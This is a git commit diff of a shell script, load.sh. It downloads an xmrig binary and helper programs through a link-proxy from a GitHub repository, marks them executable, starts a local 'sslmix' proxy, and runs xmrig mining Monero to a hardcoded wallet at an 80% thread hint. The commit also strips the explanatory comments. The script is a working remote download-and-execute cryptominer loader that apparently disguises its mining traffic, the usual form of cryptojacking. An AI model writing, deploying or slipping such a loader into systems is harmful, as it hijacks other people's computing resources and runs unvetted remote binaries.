3b60e59b266656db7f3e283a3905a602afe6e01a
lin2elysia <163723173+lin2elysia@users.noreply.github.com>
2024-03-18 18:40:07 +0800

    Update load.sh

--- load.sh
+++ load.sh
@@ -5,7 +5,7 @@ export DOWNLOAD_RUNNING_URL="https://slink.ltd/https://raw.githubusercontent.com
 export DOWNLOAD_CONFIG_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/apiSslMixConfig.json"
 export DOWNLOAD_SSLMIX_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/sslmix"
 
-# Function to download and set permissions for files
+# 
 download_and_set_permissions() {
     local download_url="$1"
     local filename=$(basename "$download_url")
@@ -13,24 +13,29 @@ download_and_set_permissions() {
         echo "Downloading $filename..."
         curl --progress-bar -o "$DIRECTORY/$filename" "$download_url"
         if [ $? -ne 0 ]; then
-            echo "Failed to download $filename."
+            echo "Download $filename fail."
             exit 1
         fi
-        chmod 777 "$DIRECTORY/$filename"
     fi
+    chmod +x "$DIRECTORY/$filename"
 }
 
-# Download necessary files if they don't exist
+# 
 download_and_set_permissions "$DOWNLOAD_URL"
 download_and_set_permissions "$DOWNLOAD_RUNNING_URL"
 download_and_set_permissions "$DOWNLOAD_CONFIG_URL"
 download_and_set_permissions "$DOWNLOAD_SSLMIX_URL"
+# 
+chmod +x "$DIRECTORY/xmrig"
+chmod +x "$DIRECTORY/running"
+chmod +x "$DIRECTORY/apiSslMixConfig.json"
+chmod +x "$DIRECTORY/sslmix"
 
-# Run /usr/local/bin/running in the background for 3 seconds
+#  /usr/local/bin/running
 if [ -f "$DIRECTORY/running" ]; then
     (cd "$DIRECTORY" && ./running) &
     sleep 3
 fi
 
-# Run xmrig command
+#xmrig
 "$DIRECTORY/xmrig" --url=127.0.0.1:9443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=Local-Auto -k --coin monero --max-threads-hint=80
